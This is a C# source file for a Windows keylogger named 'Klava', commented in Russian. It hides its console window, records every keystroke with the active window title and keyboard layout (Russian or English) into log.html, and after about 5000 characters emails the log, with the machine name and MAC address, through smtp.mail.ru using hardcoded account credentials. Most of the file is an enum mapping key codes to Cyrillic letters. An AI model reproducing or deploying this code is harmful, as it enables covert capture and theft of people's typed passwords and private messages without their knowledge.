using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Diagnostics;

namespace Klava
{
    class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);
        [DllImport("user32.dll")]
        static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);//получить ид потока
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("kernel32.dll")]//импорт стандартной библиотеки 
        static extern IntPtr GetConsoleWindow(); //прототип метода для 
        //получения дескриптора окна используемого консольюсвязанной с вызывающеим процессом
        [DllImport("user32.dll")]//импорт стандартной библотеки
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);//состояние показа определяемого окна

        const int SW_HIDE = 0;//скрывает окно и активизирует другое окно
        const int SW_SHOW = 5;//активизирует окно
        [DllImport("user32.dll")]//имопрт стандартной библиотеки

        public static extern int GetAsyncKeyState(Int32 i);//определяет является клавиша нажатой или отпущенной
        public static int writecount = 1;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();//передаём консоль
            ShowWindow(handle, SW_HIDE);//скрываем консоль
                                        //Console.Read(); 

            StringBuilder sb = new StringBuilder();//переменная для хранения значений клавиш
                                                   //  int cf = 1;//счётчик файлов
            string language = ""; //переменная для раскладки клавиатуры
            string ProcName = "";//переменная для имени окна
            bool caps = false;
            bool lshift = false;


            while (true)//бесконечный цикл
            {
                if (language != GetLang().ToString())
                {
                    language = GetLang().ToString();
                    if (language == "1049")
                    {
                        Console.WriteLine("\n RUS: ");
                        sb.Insert(sb.Length, "<p><i> RUS:</i></p>");
                    }
                    else
                    {
                        Console.WriteLine("\n ENG: ");
                        sb.Insert(sb.Length, "<p> <i>ENG:</i></p>");
                    }
                }
                Thread.Sleep(10);

                for (Int32 i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(20) == -32767) //состояние caps
                    {
                        caps = !caps;
                    }
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)//если вернул старший бит значит клавиша нажата 
                                                            //если самый младший клавиша была нажата после прдыдущего вызова  
                    {
                        if (ProcName != GetProcInfo())//проверка на переключение активного окна
                        {
                            ProcName = GetProcInfo();
                            Console.WriteLine("\n{0}", ProcName);
                            sb.Insert(sb.Length, String.Format("\n <p><b>{0}:</b></p>", ProcName));
                        }

                        GetCurrentLanguage(sb, language, i, caps, lshift);

                        File.WriteAllText("log.html", sb.ToString());

                        if (sb.Length >= 5000 && CheckForInternetConnection())//проверка числа нажатий  и интернет соединения
                        {
                            Thread thread2 = new Thread(copy);
                            thread2.Start();
                            SendMail(sb, "smtp.mail.ru", "vladik_hahel@mail.ru", "1q2q3q4q5q", "vladislav_hahel@mail.ru", Environment.MachineName, "MAC: " + GetMACs(), @"send.html");
                            //создание текстового файла и запись в него занчения sb c послед очисткой значения sb
                            thread2.Abort();
                        }
                    }
                }
            }
        }
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (client.OpenRead("http://clients3.google.com/generate_204"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
        static void copy()
        {
            File.Copy("log.html", "send.html", true);
        }
        private static void GetCurrentLanguage(StringBuilder sb, string language, int i, bool isCaps, bool isShift)
        {

            bool reg = isCaps;
            string keyChar;

            if (language == "1049")
                keyChar = ((KeysRus)i).ToString();
            else
                keyChar = ((Keys)i).ToString();
            if (!reg)
                keyChar = keyChar.ToLowerInvariant();
            //  Console.Write(keyChar);                                                                                                      
            sb.Insert(sb.Length, String.Format("{0},", keyChar));//вставка в конец нового значения клавиши

            if (sb.Length % 100 < 30 && sb.Length > 100 * writecount)
            {
                sb.Insert(sb.Length, "</br>");
                writecount++;
            }
        }
        public static ushort GetLang()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
        public static string GetProcInfo() //возвращает имя активного окна
        {
            IntPtr h = GetForegroundWindow();
            int pid = 0;
            GetWindowThreadProcessId(h, ref pid);
            Process p = Process.GetProcessById(pid);
            return p.MainWindowTitle;
        }
        public static string GetMACs()// метод дл получения мак-адреса
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();

            string MAC = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (MAC == String.Empty)
                {
                    IPInterfaceProperties prop = adapter.GetIPProperties();
                    MAC = adapter.GetPhysicalAddress().ToString();
                }
            }
            return MAC;
        }
        public static void SendMail(StringBuilder sb, string smtpServer, string from, string pass, 
            string mailto, string caption, string message, string attachFile = null)
        //метод для отправки сообщения
        {
            try
            {

                MailMessage mail = new MailMessage();//объект класса MailMessage
                mail.From = new MailAddress(from);//от кого
                mail.To.Add(new MailAddress(mailto));//кому
                mail.Subject = caption;//тема
                mail.Body = message;//текст
                if (!string.IsNullOrEmpty(attachFile))
                {
                    mail.Attachments.Add(new Attachment(attachFile));
                    SmtpClient client = new SmtpClient();
                    client.Host = smtpServer;//протококл
                    client.Port = 587;//порт
                    client.EnableSsl = true;//шифрование
                    client.Credentials = new NetworkCredential(from.Split('@')[0], pass);
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;//способ доаствки
                    client.Send(mail);//отправка
                    mail.Dispose();
                    sb.Clear();

                }

            }
            catch (Exception e)
            {
                
            }
        }
    }
    public enum KeysRus
    {
        Modifiers = -65536,
        //
        // Сводка:
        //     Нет нажатых клавиш.
        None = 0,
        //
        // Сводка:
        //     Левой кнопки мыши.
        LButton = 1,
        //
        // Сводка:
        //     Правой кнопкой мыши.
        RButton = 2,
        //
        // Сводка:
        //     Клавиша "Отмена".
        Cancel = 3,
        //
        // Сводка:
        //     Средняя кнопка мыши (мыши).
        MButton = 4,
        //
        // Сводка:
        //     Первая кнопка мыши (пяти кнопку мыши).
        XButton1 = 5,
        //
        // Сводка:
        //     Вторая кнопка мыши (пяти кнопку мыши).
        XButton2 = 6,
        //
        // Сводка:
        //     Клавиша BACKSPACE.
        Back = 8,
        //
        // Сводка:
        //     Клавиша TAB.
        Tab = 9,
        //
        // Сводка:
        //     Клавиша перевода строки.
        LineFeed = 10,
        //
        // Сводка:
        //     Клавиша CLEAR.
        Clear = 12,
        //
        // Сводка:
        //     Клавиша RETURN.
        Return = 13,
        //
        // Сводка:
        //     Клавиша ВВОД.
        Enter = 13,
        //
        // Сводка:
        //     Клавиша SHIFT.
        ShiftKey = 16,
        //
        // Сводка:
        //     Клавиша CTRL.
        ControlKey = 17,
        //
        // Сводка:
        //     Клавиша ALT.
        Menu = 18,
        //
        // Сводка:
        //     Клавиша PAUSE.
        Pause = 19,
        //
        // Сводка:
        //     Клавиша CAPS LOCK.
        Capital = 20,
        //
        // Сводка:
        //     Клавиша CAPS LOCK.
        CapsLock = 20,
        //
        // Сводка:
        //     Клавиша режима "Кана" редактора метода ввода.
        KanaMode = 21,
        //
        // Сводка:
        //     Клавиша режима IME Hanguel. (поддерживается для совместимости; используйте HangulMode)
        HanguelMode = 21,
        //
        // Сводка:
        //     Клавиша режима "Хангыль" редактора метода ввода.
        HangulMode = 21,
        //
        // Сводка:
        //     Клавиша режима "Джунджа" редактора метода ввода.
        JunjaMode = 23,
        //
        // Сводка:
        //     Ключ, последний режим редактора метода ввода.
        FinalMode = 24,
        //
        // Сводка:
        //     Клавиша режима "Ханджа" редактора метода ввода.
        HanjaMode = 25,
        //
        // Сводка:
        //     Клавиша режима "Кандзи" редактора метода ввода.
        KanjiMode = 25,
        //
        // Сводка:
        //     Клавиша ESC.
        Escape = 27,
        //
        // Сводка:
        //     Клавиша преобразования IME.
        IMEConvert = 28,
        //
        // Сводка:
        //     Клавиша без преобразования IME.
        IMENonconvert = 29,
        //
        // Сводка:
        //     Клавиша заменяет принятия IME System.Windows.Forms.Keys.IMEAceept.
        IMEAccept = 30,
        //
        // Сводка:
        //     Клавиша принятия IME. Является устаревшей, используйте System.Windows.Forms.Keys.IMEAccept
        //     вместо него.
        IMEAceept = 30,
        //
        // Сводка:
        //     Клавиша изменение режима редактора метода ввода.
        IMEModeChange = 31,
        //
        // Сводка:
        //     Клавиша ПРОБЕЛ.
        Space = 32,
        //
        // Сводка:
        //     Клавиша PAGE UP.
        Prior = 33,
        //
        // Сводка:
        //     Клавиша PAGE UP.
        PageUp = 33,
        //
        // Сводка:
        //     Клавиша PAGE DOWN.
        Next = 34,
        //
        // Сводка:
        //     Клавиша PAGE DOWN.
        PageDown = 34,
        //
        // Сводка:
        //     Клавиша END.
        End = 35,
        //
        // Сводка:
        //     Клавиша HOME.
        Home = 36,
        //
        // Сводка:
        //     Клавиша СТРЕЛКА ВЛЕВО.
        Left = 37,
        //
        // Сводка:
        //     Клавиша СТРЕЛКА ВВЕРХ.
        Up = 38,
        //
        // Сводка:
        //     Клавиша СТРЕЛКА ВПРАВО.
        Right = 39,
        //
        // Сводка:
        //     Клавиша СТРЕЛКА ВНИЗ.
        Down = 40,
        //
        // Сводка:
        //     Клавиша SELECT.
        Select = 41,
        //
        // Сводка:
        //     Клавиша PRINT.
        Print = 42,
        //
        // Сводка:
        //     Клавиша EXECUTE.
        Execute = 43,
        //
        // Сводка:
        //     Клавиша PRINT SCREEN.
        Snapshot = 44,
        //
        // Сводка:
        //     Клавиша PRINT SCREEN.
        PrintScreen = 44,
        //
        // Сводка:
        //     Клавишу INS.
        Insert = 45,
        //
        // Сводка:
        //     DEL ключ.
        Delete = 46,
        //
        // Сводка:
        //     Клавиша HELP.
        Help = 47,
        //
        // Сводка:
        //     Клавиша 0.
        D0 = 48,
        //
        // Сводка:
        //     Клавиша 1.
        D1 = 49,
        //
        // Сводка:
        //     Клавиша 2.
        D2 = 50,
        //
        // Сводка:
        //     Клавиша 3.
        D3 = 51,
        //
        // Сводка:
        //     Клавиша 4.
        D4 = 52,
        //
        // Сводка:
        //     Клавиша 5.
        D5 = 53,
        //
        // Сводка:
        //     Клавиша 6.
        D6 = 54,
        //
        // Сводка:
        //     Клавиша 7.
        D7 = 55,
        //
        // Сводка:
        //     Клавиша 8.
        D8 = 56,
        //
        // Сводка:
        //     Клавиша 9.
        D9 = 57,
        //
        // Сводка:
        //     Клавиша A.
        Ф = 65,
        //
        // Сводка:
        //     Клавиша B.
        И = 66,
        //
        // Сводка:
        //     Клавиша C.
        С = 67,
        //
        // Сводка:
        //     Клавиша D.
        В = 68,
        //
        // Сводка:
        //     Клавиша E.
        У = 69,
        //
        // Сводка:
        //     Клавиша F.
        А = 70,
        //
        // Сводка:
        //     Клавиша G.
        П = 71,
        //
        // Сводка:
        //     Клавиша H.
        Р = 72,
        //
        // Сводка:
        //     Клавиша I.
        Ш = 73,
        //
        // Сводка:
        //     Клавиша J.
        О = 74,
        //
        // Сводка:
        //     Клавиша K.
        Л = 75,
        //
        // Сводка:
        //     Клавиша L.
        Д = 76,
        //
        // Сводка:
        //     Клавиша M.
        Ь = 77,
        //
        // Сводка:
        //     Клавиша N.
        Т = 78,
        //
        // Сводка:
        //     Клавиша O.
        Щ = 79,
        //
        // Сводка:
        //     Клавиша P.
        З = 80,
        //
        // Сводка:
        //     Клавиша Q.
        Й = 81,
        //
        // Сводка:
        //     Клавиша R.
        К = 82,
        //
        // Сводка:
        //     Клавиша S.
        Ы = 83,
        //
        // Сводка:
        //     Клавиша T.
        Е = 84,
        //
        // Сводка:
        //     Клавиша U.
        Г = 85,
        //
        // Сводка:
        //     Клавиша V.
        М = 86,
        //
        // Сводка:
        //     Клавиша W.
        Ц = 87,
        //
        // Сводка:
        //     Клавиша X.
        Ч = 88,
        //
        // Сводка:
        //     Клавиша Y.
        Н = 89,
        //
        // Сводка:
        //     Клавиша Z.
        Я = 90,
        //
        // Сводка:
        //     Левая клавиша с логотипом Windows (клавиатура Microsoft Natural Keyboard).
        LWin = 91,
        //
        // Сводка:
        //     Правая клавиша с логотипом Windows (клавиатура Microsoft Natural Keyboard).
        RWin = 92,
        //
        // Сводка:
        //     Клавиша приложения (клавиатура Microsoft Natural Keyboard).
        Apps = 93,
        //
        // Сводка:
        //     Ключ компьютера спящего режима.
        Sleep = 95,
        //
        // Сводка:
        //     Клавиша 0 на цифровой клавиатуре.
        NumPad0 = 96,
        //
        // Сводка:
        //     Клавиша 1 на цифровой клавиатуре.
        NumPad1 = 97,
        //
        // Сводка:
        //     Клавиша 2 на цифровой клавиатуре.
        NumPad2 = 98,
        //
        // Сводка:
        //     Клавиша 3 на цифровой клавиатуре.
        NumPad3 = 99,
        //
        // Сводка:
        //     Клавиша 4 на цифровой клавиатуре.
        NumPad4 = 100,
        //
        // Сводка:
        //     Клавиша 5 на цифровой клавиатуре.
        NumPad5 = 101,
        //
        // Сводка:
        //     Клавиша 6 на цифровой клавиатуре.
        NumPad6 = 102,
        //
        // Сводка:
        //     Клавиша 7 на цифровой клавиатуре.
        NumPad7 = 103,
        //
        // Сводка:
        //     Клавиша 8 на цифровой клавиатуре.
        NumPad8 = 104,
        //
        // Сводка:
        //     Клавиша 9 на цифровой клавиатуре.
        NumPad9 = 105,
        //
        // Сводка:
        //     Клавиша умножения.
        Multiply = 106,
        //
        // Сводка:
        //     Клавиша сложения.
        Add = 107,
        //
        // Сводка:
        //     Клавиша разделителя.
        Separator = 108,
        //
        // Сводка:
        //     Клавиша вычитания.
        Subtract = 109,
        //
        // Сводка:
        //     Клавиша десятичного разделителя.
        Decimal = 110,
        //
        // Сводка:
        //     Клавиша деления.
        Divide = 111,
        //
        // Сводка:
        //     Клавиша F1.
        F1 = 112,
        //
        // Сводка:
        //     Клавиша F2.
        F2 = 113,
        //
        // Сводка:
        //     Клавиша F3.
        F3 = 114,
        //
        // Сводка:
        //     Клавиша F4.
        F4 = 115,
        //
        // Сводка:
        //     Клавиша F5.
        F5 = 116,
        //
        // Сводка:
        //     Клавиша F6.
        F6 = 117,
        //
        // Сводка:
        //     Клавиша F7.
        F7 = 118,
        //
        // Сводка:
        //     Клавиша F8.
        F8 = 119,
        //
        // Сводка:
        //     Клавиша F9.
        F9 = 120,
        //
        // Сводка:
        //     Клавиша F10.
        F10 = 121,
        //
        // Сводка:
        //     Клавиша F11.
        F11 = 122,
        //
        // Сводка:
        //     Клавиша F12.
        F12 = 123,
        //
        // Сводка:
        //     Клавиша F13.
        F13 = 124,
        //
        // Сводка:
        //     Клавиша F14.
        F14 = 125,
        //
        // Сводка:
        //     Клавиша F15.
        F15 = 126,
        //
        // Сводка:
        //     Клавиша F16.
        F16 = 127,
        //
        // Сводка:
        //     Клавиша F17.
        F17 = 128,
        //
        // Сводка:
        //     Клавиша F18.
        F18 = 129,
        //
        // Сводка:
        //     Клавиша F19.
        F19 = 130,
        //
        // Сводка:
        //     Клавиша F20.
        F20 = 131,
        //
        // Сводка:
        //     Клавиша F21.
        F21 = 132,
        //
        // Сводка:
        //     Клавиша F22.
        F22 = 133,
        //
        // Сводка:
        //     Клавиша F23.
        F23 = 134,
        //
        // Сводка:
        //     Клавиша F24.
        F24 = 135,
        //
        // Сводка:
        //     Клавиша NUM LOCK.
        NumLock = 144,
        //
        // Сводка:
        //     Клавиша SCROLL LOCK.
        Scroll = 145,
        //
        // Сводка:
        //     Левая клавиша SHIFT.
        LShiftKey = 160,
        //
        // Сводка:
        //     Правая клавиша SHIFT.
        RShiftKey = 161,
        //
        // Сводка:
        //     Левая клавиша CTRL.
        LControlKey = 162,
        //
        // Сводка:
        //     Правая клавиша CTRL.
        RControlKey = 163,
        //
        // Сводка:
        //     Левая клавиша ALT.
        LMenu = 164,
        //
        // Сводка:
        //     Правая клавиша ALT.
        RMenu = 165,
        //
        // Сводка:
        //     Клавиша возврата обозревателя (Windows 2000 или более поздней версии).
        BrowserBack = 166,
        //
        // Сводка:
        //     Ключ прямой браузера (Windows 2000 или более поздней версии).
        BrowserForward = 167,
        //
        // Сводка:
        //     Клавиша обновления обозревателя (Windows 2000 или более поздней версии).
        BrowserRefresh = 168,
        //
        // Сводка:
        //     Клавиша остановки обозревателя (Windows 2000 или более поздней версии).
        BrowserStop = 169,
        //
        // Сводка:
        //     Клавиша поиска обозревателя (Windows 2000 или более поздней версии).
        BrowserSearch = 170,
        //
        // Сводка:
        //     Клавиша браузера "Избранное" (Windows 2000 или более поздней версии).
        BrowserFavorites = 171,
        //
        // Сводка:
        //     Клавиша home обозревателя (Windows 2000 или более поздней версии).
        BrowserHome = 172,
        //
        // Сводка:
        //     Клавиша выключения звука тома (Windows 2000 или более поздней версии).
        VolumeMute = 173,
        //
        // Сводка:
        //     (Windows 2000 или более поздней версии) клавиша уменьшения громкости.
        VolumeDown = 174,
        //
        // Сводка:
        //     (Windows 2000 или более поздней версии) Клавиша увеличения громкости.
        VolumeUp = 175,
        //
        // Сводка:
        //     Перехода к следующей записи ключа (Windows 2000 или более поздней версии).
        MediaNextTrack = 176,
        //
        // Сводка:
        //     Перехода на предыдущую запись ключ (Windows 2000 или более поздней версии).
        MediaPreviousTrack = 177,
        //
        // Сводка:
        //     Клавиша остановки мультимедиа (Windows 2000 или более поздней версии).
        MediaStop = 178,
        //
        // Сводка:
        //     Клавиша приостановки воспроизведения (Windows 2000 или более поздней версии).
        MediaPlayPause = 179,
        //
        // Сводка:
        //     Клавиша запуска почты (Windows 2000 или более поздней версии).
        LaunchMail = 180,
        //
        // Сводка:
        //     Выберите носитель ключ (Windows 2000 или более поздней версии).
        SelectMedia = 181,
        //
        // Сводка:
        //     Запуск приложения один ключ (Windows 2000 или более поздней версии).
        LaunchApplication1 = 182,
        //
        // Сводка:
        //     Клавиша запуска приложения два (Windows 2000 или более поздней версии).
        LaunchApplication2 = 183,
        //
        // Сводка:
        //     Клавиша OEM с запятой на стандартной клавиатуре США (Windows 2000 или более поздней
        //     версии).
        OemSemicolon = 186,
        //
        // Сводка:
        //     Клавиша OEM 1.
        Ж = 186,
        //
        // Сводка:
        //     Клавиша плюса ПВТ на клавиатуре любой страны или региона (Windows 2000 или более
        //     поздней версии).
        Oemplus = 187,
        //
        // Сводка:
        //     Клавиша OEM с запятой на клавиатуре любой страны или региона (Windows 2000 или
        //     более поздней версии).
        Б = 188,
        //
        // Сводка:
        //     Клавиша OEM с минусом на клавиатуре любой страны или региона (Windows 2000 или
        //     более поздней версии).
        OemMinus = 189,
        //
        // Сводка:
        //     Ключ OEM периода на клавиатуре любой страны или региона (Windows 2000 или более
        //     поздней версии).
        Ю = 190,
        //
        // Сводка:
        //     Клавиша вопросительного знака ПВТ на стандартной клавиатуре США (Windows 2000
        //     или более поздней версии).
        OemQuestion = 191,
        //
        // Сводка:
        //     Клавиша OEM 2.
        Oem2 = 191,
        //
        // Сводка:
        //     Клавиша OEM тильды на стандартной клавиатуре США (Windows 2000 или более поздней
        //     версии).
        Ё = 192,
        //
        // Сводка:
        //     Клавиша OEM 3.
        Oem3 = 192,
        //
        // Сводка:
        //     Клавиша OEM открывающая скобка на стандартной клавиатуре США (Windows 2000 или
        //     более поздней версии).
        Х = 219,
        //
        // Сводка:
        //     Клавиша OEM 4.
        Oem4 = 219,
        //
        // Сводка:
        //     Клавиша OEM вертикальной черты на стандартной клавиатуре США (Windows 2000 или
        //     более поздней версии).
        OemPipe = 220,
        //
        // Сводка:
        //     Клавиша OEM 5.
        Oem5 = 220,
        //
        // Сводка:
        //     Клавиша OEM закрывающая квадратная скобка на стандартной клавиатуре США (Windows
        //     2000 или более поздней версии).
        Ъ = 221,
        //
        // Сводка:
        //     Клавиша OEM 6.
        Oem6 = 221,
        //
        // Сводка:
        //     OEM одинарной или двойной кавычки ключа на стандартной клавиатуре США (Windows
        //     2000 или более поздней версии).
        OemQuotes = 222,
        //
        // Сводка:
        //     Клавиша OEM 7.
        Э = 222,
        //
        // Сводка:
        //     Клавиша OEM 8.
        Oem8 = 223,
        //
        // Сводка:
        //     Угловой скобки ПВТ или обратной косой чертой на клавиатуре RT 102 ключа (Windows
        //     2000 или более поздней версии).
        OemBackslash = 226,
        //
        // Сводка:
        //     Клавиша OEM 102.
        Oem102 = 226,
        //
        // Сводка:
        //     Клавиша ОБРАБОТКИ.
        ProcessKey = 229,
        //
        // Сводка:
        //     Используется для передачи символов Юникода в виде нажатий клавиш. Значение клавиши
        //     пакета является младшим словом значения виртуальная клавиша 32 бита, используемый
        //     для методов ввода не клавиатуры.
        Packet = 231,
        //
        // Сводка:
        //     Клавиша ATTN.
        Attn = 246,
        //
        // Сводка:
        //     Клавиша CRSEL.
        Crsel = 247,
        //
        // Сводка:
        //     Клавиша EXSEL.
        Exsel = 248,
        //
        // Сводка:
        //     Клавиша ERASE EOF.
        EraseEof = 249,
        //
        // Сводка:
        //     Клавиша PLAY.
        Play = 250,
        //
        // Сводка:
        //     Клавиша ZOOM.
        Zoom = 251,
        //
        // Сводка:
        //     Константа, зарезервированная для использования в будущем.
        NoName = 252,
        //
        // Сводка:
        //     Клавиша PA1.
        Pa1 = 253,
        //
        // Сводка:
        //     Клавиша CLEAR.
        OemClear = 254,
        //
        // Сводка:
        //     Битовая маска для извлечения кода клавиши из значения ключа.
        KeyCode = 65535,
        //
        // Сводка:
        //     Клавиша SHIFT.
        Shift = 65536,
        //
        // Сводка:
        //     Клавиша CTRL.
        Control = 131072,
        //
        // Сводка:
        //     Клавиша модификатора ALT.
        Alt = 262144
    }
}
